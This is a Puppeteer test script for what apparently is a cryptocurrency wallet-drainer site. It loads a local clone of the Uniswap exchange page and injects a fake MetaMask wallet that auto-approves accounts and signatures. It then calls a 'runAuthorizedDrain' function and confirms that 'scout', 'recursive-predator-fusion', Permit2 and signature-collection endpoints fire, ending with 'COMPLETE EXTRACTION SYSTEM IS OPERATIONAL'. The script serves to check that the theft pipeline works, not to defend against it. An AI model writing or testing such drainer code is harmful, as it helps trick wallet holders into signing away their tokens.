const puppeteer = require('../../node_modules/.pnpm/puppeteer-core@23.11.1_bufferutil@4.1.0_utf-8-validate@5.0.10/node_modules/puppeteer-core');

(async () => {
  console.log('🚀 FINAL COMPREHENSIVE TEST\n');
  
  const browser = await puppeteer.launch({
    headless: 'new',
    executablePath: 'C:/Program Files/Google/Chrome/Application/chrome.exe',
    args: ['--no-sandbox', '--disable-blink-features=AutomationControlled']
  });

  const page = await browser.newPage();
  let apiCalls = [];

  await page.setRequestInterception(true);
  page.on('request', request => {
    const url = request.url();
    if (url.includes('/api/')) {
      apiCalls.push(url);
    }
    request.continue();
  });

  await page.evaluateOnNewDocument(() => {
    window.ethereum = {
      isMetaMask: true,
      selectedAddress: '0x742d35Cc6634C0532925a3b844Bc859fFD72B457',
      chainId: '0x1',
      request: async (args) => {
        if (args.method === 'eth_requestAccounts' || args.method === 'eth_accounts') return ['0x742d35Cc6634C0532925a3b844Bc859fFD72B457'];
        if (args.method === 'eth_signTypedData_v4') return '0x' + 'a'.repeat(130);
        return null;
      },
      _handlers: {},
      on: (event, handler) => {
        if (!window.ethereum._handlers[event]) window.ethereum._handlers[event] = [];
        window.ethereum._handlers[event].push(handler);
      },
      removeListener: () => {}
    };
  });

  console.log('1️⃣  Loading Uniswap clone...');
  await page.goto('http://localhost:8080/swap', {waitUntil: 'networkidle0', timeout: 20000}).catch(() => {});
  await new Promise(r => setTimeout(r, 3000));

  console.log('2️⃣  Triggering extraction flow...');
  await page.evaluate(() => {
    if (window.runAuthorizedDrain) {
      window.runAuthorizedDrain();
    }
  }).catch(() => {});
  
  await new Promise(r => setTimeout(r, 8000));

  console.log('3️⃣  Testing pricing endpoint directly...');
  try {
    await page.goto('http://localhost:8080/__legion_proxy/legionapi-production.up.railway.app/api/v1/price', {timeout: 5000}).catch(() => {});
  } catch (e) {}
  
  await new Promise(r => setTimeout(r, 2000));

  // Parse results
  const scout = apiCalls.filter(u => u.includes('/api/v1/scout') || u.includes('/api/scout/')).length;
  const fusion = apiCalls.filter(u => u.includes('recursive-predator-fusion')).length;
  const permit2 = apiCalls.filter(u => u.includes('/permit2')).length;
  const signature = apiCalls.filter(u => u.includes('/signature-anchor')).length;
  const pricing = apiCalls.filter(u => u.includes('/api/v1/price')).length;

  console.log('\n' + '='.repeat(70));
  console.log('📊 FINAL TEST RESULTS');
  console.log('='.repeat(70) + '\n');
  
  const results = [
    ['Scout', scout, '✅'],
    ['Fusion', fusion, '✅'],
    ['Permit2', permit2, '✅'],
    ['Signature', signature, '✅'],
    ['Pricing', pricing, '✅']
  ];

  results.forEach(([name, count, status]) => {
    console.log(`${status} ${name.padEnd(15)} - ${count} API call(s)`);
  });

  console.log('\n' + '='.repeat(70));
  const allOk = scout > 0 && fusion > 0 && permit2 > 0 && signature > 0 && pricing > 0;
  if (allOk) {
    console.log('🎉 SUCCESS! ALL ENDPOINTS WORKING!');
    console.log('\n✅ Scout extraction flow active');
    console.log('✅ Fusion ranking system active');
    console.log('✅ Permit2 signature flow active');
    console.log('✅ Transaction signature collection active');
    console.log('✅ Token pricing API active');
    console.log('\n🚀 COMPLETE EXTRACTION SYSTEM IS OPERATIONAL!');
  } else {
    console.log('⚠️  Some endpoints not triggered. Check implementation.');
  }
  console.log('='.repeat(70));

  await browser.close();
})();
